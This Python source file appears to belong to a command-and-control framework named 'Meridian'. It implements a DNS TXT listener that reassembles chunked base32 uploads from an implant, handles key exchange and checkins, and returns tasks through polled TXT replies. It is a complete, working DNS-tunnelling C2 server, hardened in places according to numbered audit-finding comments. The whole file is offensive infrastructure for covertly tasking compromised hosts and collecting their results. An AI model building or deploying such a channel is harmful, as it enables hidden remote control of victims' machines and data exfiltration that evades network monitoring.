"""DNS TXT listener (dnslib) with multi-query chunked messaging.

DNS is case-insensitive, so message payloads use UPPERCASE base32 (RFC 4648).
Messages too large for one name are split into fixed-size chunks, each sent as
its own TXT query; the server reassembles them and the implant polls for the
response (see docs/protocol.md section 6).

Query format (all against `<base>`):

    ping.<base>                           -> TXT "pong"
    uk.<msgid>.<seq>.<b32>.<base>         -> KEX upload chunk
    uc.<msgid>.<seq>.<b32>.<base>         -> checkin upload chunk
    g.<msgid>.<base>                      -> poll for response ("P" while pending)

    msgid: 8-hex unique per message; seq: decimal chunk index; a chunk shorter
    than CHUNK_SIZE marks the last chunk.

Replies: `ok` while buffering, or TXT records `00:{total}:{chunk}` /
`NN:{chunk}` once the response is ready.
"""

from __future__ import annotations

import base64
import logging
import threading
import time

from dnslib import QTYPE, RR, TXT, DNSRecord
from dnslib.server import DNSServer

from ..crypto import CryptoError, ReplayError
from .base import Listener

log = logging.getLogger("meridian.listener")

CHUNK = 180  # base64 chars per TXT record (response chunking)
LABEL = 60  # max base32 chars per label
CHUNK_SIZE = 36  # payload bytes per upload query (36B -> 58 base32 chars)
BUFFER_TTL = 45  # seconds a buffered message/response survives
# msgid length bound. KEX uploads use an 8-hex random id, but CHECKIN uploads
# are keyed by session id (32 hex) — the implant sends `uc.<session_id>...`.
# The old bound of 16 rejected every real checkin, so DNS could KEX (creating
# a session row, which is why "DNS sessions" appeared) but never deliver a
# task or a result. 64 keeps the key bounded while fitting both id shapes.
MSGID_LEN = 64
MAX_SEQ = 1024  # upper bound on chunk index (MAX_MSG_BYTES // CHUNK_SIZE)
MAX_BUFFERS = 512  # max concurrently buffered messages before we start refusing
MAX_CHUNKS_PER_MSG = 1024  # 1024 * 36B = 36KB cap on a single reassembled message
#: A ready response is served this many times before being dropped, so a lost
#: UDP reply is retransmitted instead of wedging the implant on "P" forever.
#: TTL expiry still bounds retention (see BUFFER_TTL).
POLL_DELIVERIES = 3
#: Largest response payload (bytes, pre-chunking) served over DNS. Past this
#: the reply would not survive UDP anyway; fail fast with "err" instead of
#: emitting a truncated datagram the implant cannot reassemble. Ship large
#: payloads (notably builtin/upload task args) over HTTP, not DNS.
MAX_DNS_RESP_BYTES = 4096
#: Cap on concurrent in-flight DNS resolutions (finding #30). Past this the
#: resolver answers "err" instead of spawning unbounded handler threads.
MAX_DNS_INFLIGHT = 64


def _b32e(payload: bytes) -> str:
    return base64.b32encode(payload).decode().rstrip("=")


def _b32d(text: str) -> bytes:
    text = text.upper()
    pad = "=" * (-len(text) % 8)
    return base64.b32decode(text + pad)


def _b64_chunks(data: bytes) -> list[str]:
    s = base64.b64encode(data).decode()
    return [s[i : i + CHUNK] for i in range(0, len(s), CHUNK)] or [""]


def _reply_records(data: bytes) -> list[str]:
    chunks = _b64_chunks(data)
    total = len(chunks)
    out = []
    for i, c in enumerate(chunks):
        out.append(f"{i:02d}:{total}:{c}" if i == 0 else f"{i:02d}:{c}")
    return out


class MeridianResolver:
    def __init__(self, listener: DnsListener):
        self.l = listener
        self.base = listener.cfg.domain.rstrip(".")
        self._lock = threading.Lock()
        self._inflight = threading.Semaphore(MAX_DNS_INFLIGHT)
        # msgid -> {"chunks": {seq: bytes}, "done": bool, "resp": bytes|None,
        #           "polls": int, "t": float}
        self._msgs: dict[str, dict] = {}

    def _reply_txt(self, request: DNSRecord, records: list[str]) -> DNSRecord:
        reply = request.reply()
        for txt in records:
            reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(txt)))
        return reply

    def resolve(self, request: DNSRecord, handler) -> DNSRecord:
        # Finding #30: bound how many resolutions run at once. dnslib serves
        # each query on its own thread with no cap of its own.
        if not self._inflight.acquire(blocking=False):
            log.warning("dns resolver saturated, refusing query")
            return self._reply_txt(request, ["err"])
        try:
            return self._resolve_inner(request, handler)
        finally:
            self._inflight.release()

    def _resolve_inner(self, request: DNSRecord, handler) -> DNSRecord:
        try:
            qname = str(request.q.qname).rstrip(".").lower()
            labels = qname.split(".")
            base_labels = self.base.split(".")
            if labels[-len(base_labels) :] != base_labels:
                return self._reply_txt(request, ["err"])
            sub = labels[: -len(base_labels)]
            if not sub:
                return self._reply_txt(request, ["err"])
            marker = sub[0]
            if marker == "ping":
                return self._reply_txt(request, ["pong"])
            if marker in ("uk", "uc"):
                return self._on_upload(marker, sub[1:], request)
            if marker == "ue":
                return self._on_upload_end(sub[1:], request)
            if marker == "g":
                if len(sub) < 2:
                    return self._reply_txt(request, ["err"])
                return self._on_poll(sub[1], request)
            return self._reply_txt(request, ["err"])
        except CryptoError as exc:
            # Finding #18 (DNS half): a well-formed Meridian query that fails
            # crypto is someone replaying, tampering, or key-mismatched — not
            # background scanner noise (that fails parsing instead). Log it
            # with the source address for DFIR.
            try:
                peer = f"{handler.client_address[0]}:{handler.client_address[1]}"
            except Exception:
                peer = "?"
            log.warning(
                "dns crypto rejection from %s: %s", peer, exc,
                extra={"event": "dns_crypto_reject", "ip": peer},
            )
            return self._reply_txt(request, ["err"])
        except Exception as exc:
            log.debug("dns resolve error: %s", exc)
            return self._reply_txt(request, ["err"])

    # ------------------------------------------------------------- upload
    def _on_upload(self, marker: str, parts: list[str], request: DNSRecord) -> DNSRecord:
        if len(parts) < 3:
            return self._reply_txt(request, ["err"])
        msgid = parts[0]
        # seq is attacker-controlled: int() accepts "1_0", "+7", " 12 " and an
        # unbounded magnitude, which used to reach range() and hang the whole
        # resolver under the global lock. Validate strictly and bound it.
        if len(msgid) > MSGID_LEN or not msgid.isascii():
            return self._reply_txt(request, ["err"])
        seq_part = parts[1]
        if not seq_part.isascii() or not seq_part.isdigit():
            return self._reply_txt(request, ["err"])
        seq = int(seq_part)
        if seq >= MAX_SEQ:
            return self._reply_txt(request, ["err"])
        if len(parts[2]) > LABEL or sum(len(p) for p in parts[2:]) > LABEL:
            return self._reply_txt(request, ["err"])
        try:
            chunk = _b32d("".join(parts[2:]))
        except (ValueError, TypeError):
            return self._reply_txt(request, ["err"])
        with self._lock:
            self._purge_locked()
            if msgid not in self._msgs and len(self._msgs) >= MAX_BUFFERS:
                return self._reply_txt(request, ["err"])
            state = self._msgs.get(msgid)
            if state is None:
                state = {"chunks": {}, "resp": None, "t": time.time(),
                         "marker": marker}
                self._msgs[msgid] = state
            state["t"] = time.time()
            if seq not in state["chunks"] and len(state["chunks"]) >= MAX_CHUNKS_PER_MSG:
                # unbounded per-message growth: drop it rather than buffer more
                del self._msgs[msgid]
                return self._reply_txt(request, ["err"])
            state["chunks"][seq] = chunk
            # A short chunk marks the last one. Messages whose length is an
            # exact multiple of CHUNK_SIZE have no short chunk; the implant
            # closes those with an explicit `ue` terminator (see
            # _on_upload_end). (The old `seq == 999` magic is gone: it marked
            # any message done on a magic index with no length check.)
            if len(chunk) < CHUNK_SIZE:
                state["done"] = True
            dispatch = None
            # The dispatching flag is load-bearing: without checking it, two
            # racing uploads of the same message both dispatch, executing the
            # tasks twice and duplicating results. (It was set but never read.)
            if (state.get("resp") is None and not state.get("dispatching")
                    and state.get("done") and self._complete(state)):
                dispatch = self._assemble(state)
                state["dispatching"] = True
        if dispatch is not None:
            # AES + SQLite work happens OUTSIDE the resolver lock, otherwise one
            # slow dispatch stalls every other DNS query in the process.
            try:
                resp = self.l.dispatch(marker, msgid, dispatch)
            except ReplayError:
                # Same bytes re-uploaded while the first dispatch is still in
                # flight. The first delivery is running; answer idempotently
                # instead of destroying its state slot.
                return self._reply_txt(request, ["ok"])
            except CryptoError:
                with self._lock:
                    self._msgs.pop(msgid, None)
                return self._reply_txt(request, ["err"])
            except Exception as exc:
                log.warning("dns dispatch failed: %s", exc)
                with self._lock:
                    self._msgs.pop(msgid, None)
                return self._reply_txt(request, ["err"])
            with self._lock:
                state = self._msgs.get(msgid)
                if state is not None:
                    state["resp"] = resp
                    state.pop("dispatching", None)
        return self._reply_txt(request, ["ok"])

    def _complete(self, state: dict) -> bool:
        seqs = state["chunks"]
        if not seqs:
            return False
        last = max(seqs)
        # O(1): chunks are unique by construction, so a full 0..last range means
        # exactly last+1 entries (the old all(i in seqs ...) was O(last)).
        return len(seqs) == last + 1

    def _assemble(self, state: dict) -> bytes:
        seqs = state["chunks"]
        return b"".join(seqs[i] for i in range(max(seqs) + 1))

    def _on_upload_end(self, parts: list[str], request: DNSRecord) -> DNSRecord:
        """Terminator for messages whose length is an exact multiple of
        CHUNK_SIZE (finding #8).

        The implant sends `ue.<msgid>.<n>.<base>` after uploading `n` full
        chunks: with no short chunk the short-chunk rule can never fire, so
        without this the message buffers until TTL and the implant polls "P"
        until its own timeout. Old implants never send `ue` and are unaffected
        (short-chunk completion still applies to them).
        """
        if len(parts) < 2:
            return self._reply_txt(request, ["err"])
        msgid = parts[0]
        if len(msgid) > MSGID_LEN or not msgid.isascii():
            return self._reply_txt(request, ["err"])
        if not parts[1].isascii() or not parts[1].isdigit():
            return self._reply_txt(request, ["err"])
        expect = int(parts[1])
        if expect > MAX_CHUNKS_PER_MSG:
            return self._reply_txt(request, ["err"])
        with self._lock:
            self._purge_locked()
            state = self._msgs.get(msgid)
            if state is None:
                return self._reply_txt(request, ["err"])
            state["t"] = time.time()
            if len(state["chunks"]) != expect:
                # Chunks still in flight (or a forged terminator): the pending
                # uploads will complete it via the short-chunk rule, or TTL
                # will reap it. Either way do not dispatch a partial message.
                return self._reply_txt(request, ["ok"])
            state["done"] = True
            dispatch = None
            if (state.get("resp") is None and not state.get("dispatching")
                    and self._complete(state)):
                dispatch = self._assemble(state)
                state["dispatching"] = True
        if dispatch is not None:
            try:
                resp = self.l.dispatch(state.get("marker", "uc"), msgid, dispatch)
            except ReplayError:
                return self._reply_txt(request, ["ok"])
            except Exception as exc:
                log.warning("dns dispatch failed: %s", exc)
                with self._lock:
                    self._msgs.pop(msgid, None)
                return self._reply_txt(request, ["err"])
            with self._lock:
                state = self._msgs.get(msgid)
                if state is not None:
                    state["resp"] = resp
                    state.pop("dispatching", None)
        return self._reply_txt(request, ["ok"])

    # -------------------------------------------------------------- poll
    def _on_poll(self, msgid: str, request: DNSRecord) -> DNSRecord:
        with self._lock:
            state = self._msgs.get(msgid)
            if state is None or state["resp"] is None:
                return self._reply_txt(request, ["P"])
            if len(state["resp"]) > MAX_DNS_RESP_BYTES:
                # Finding #10: a multi-KB sealed reply cannot survive UDP, and
                # emitting it truncated would fail reassembly on the implant
                # with no diagnostic. Fail fast; large payloads go over HTTP.
                log.warning(
                    "dns response for %s too large (%d bytes), refusing",
                    msgid, len(state["resp"]),
                    extra={"event": "dns_resp_too_large", "bytes": len(state["resp"])},
                )
                del self._msgs[msgid]
                return self._reply_txt(request, ["err"])
            records = _reply_records(state["resp"])
            # Finding #9: the response used to be deleted on first poll, so a
            # single lost UDP reply wedged the implant on "P" until its own
            # timeout even though the answer was ready. Retain it for a few
            # deliveries; TTL expiry still bounds retention.
            polls = state.get("polls", 0) + 1
            state["polls"] = polls
            if polls >= POLL_DELIVERIES:
                del self._msgs[msgid]
            return self._reply_txt(request, records)

    def _purge_locked(self) -> None:
        now = time.time()
        dead = [k for k, s in self._msgs.items() if now - s["t"] > BUFFER_TTL]
        for k in dead:
            del self._msgs[k]


class DnsListener(Listener):
    name = "dns"
    transport = "dns"

    def __init__(self, app, cfg):
        super().__init__(app, cfg)
        self._server: DNSServer | None = None

    def _shutdown(self) -> None:
        # Finding #11: the DNSServer thread (and its UDP socket) was never
        # stopped, so stop() leaked the thread and a restart failed to bind.
        server, self._server = self._server, None
        if server is not None:
            try:
                server.stop()
            except Exception as exc:
                log.warning("dns server stop failed: %s", exc)

    def dispatch(self, marker: str, msgid: str, payload: bytes) -> bytes:
        """Dispatch an assembled message; returns the response frame."""
        if marker == "uk":
            return self.handle_dns_kex(payload)
        if marker == "uc":
            return self.handle_dns_checkin(msgid, payload)
        raise CryptoError("unknown message type")

    def _run(self) -> None:
        resolver = MeridianResolver(self)
        self._server = DNSServer(resolver, port=self.cfg.port, address=self.cfg.host)
        self._server.start_thread()
        while self.running:
            time.sleep(0.5)
